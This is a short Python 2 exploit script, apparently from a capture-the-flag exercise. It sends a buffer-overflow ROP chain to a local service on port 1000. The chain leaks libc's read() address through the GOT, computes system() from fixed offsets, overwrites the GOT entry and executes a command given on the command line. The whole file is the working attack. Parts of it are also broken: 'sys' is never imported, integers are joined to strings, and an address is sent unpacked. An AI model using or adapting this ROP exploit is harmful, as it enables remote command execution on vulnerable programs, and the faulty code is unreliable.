import socket
import struct
try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        addr = ('127.0.0.1', 1000)
        libc_red_off = 0xd5b00
        libc_sys_off = 0x3ada0

        cmd = sys.argv[1]+"\0"
        payload = ""
        payload += "A"*140
        payload += struct.pack("<I", 0x0804832c) #addr of read
        payload += struct.pack("<I", 0x080484b6) #pop esi ; pop edi ; pop ebp ; ret
        payload += struct.pack("<I", 0) #stdin
        payload += struct.pack("<I", 0x08049530) #.dynamic
        payload += struct.pack("<I", len(cmd))

        payload += struct.pack("<I", 0x0804830c)
        payload += struct.pack("<I", 0x080484b6) #pop esi ; pop edi ; pop ebp ; ret     
        payload += struct.pack("<I", 1)#stdout
        payload += struct.pack("<I", 0x0804961c) #read in got
        payload += struct.pack("<I", 4)

        payload += struct.pack("<I", 0x0804832c) #addr of read
        payload += struct.pack("<I", 0x080484b6) #pop esi ; pop edi ; pop ebp ; ret
        payload += struct.pack("<I", 0) #stdin
        payload += struct.pack("<I", 0x0804961c) #read in got
        payload += struct.pack("<I", 4)

        payload += struct.pack("<I", 0x0804832c) #addr of read
        payload += "CCCC"
        payload += struct.pack("<I", 0x08049530) #.dynamic


        s.connect(addr)
        s.send(payload)
        s.send(cmd)
        readaddr = struct.unpack("<I", s.recv(1024))[0]
        print "libc read() found: "+readaddr
        sysaddr = readaddr - libc_red_off + libc_sys_off
        print "System found at: "+ sysaddr
        s.send(sysaddr)
        print s.recv(1024)

except socket.error, ex:
        print ex
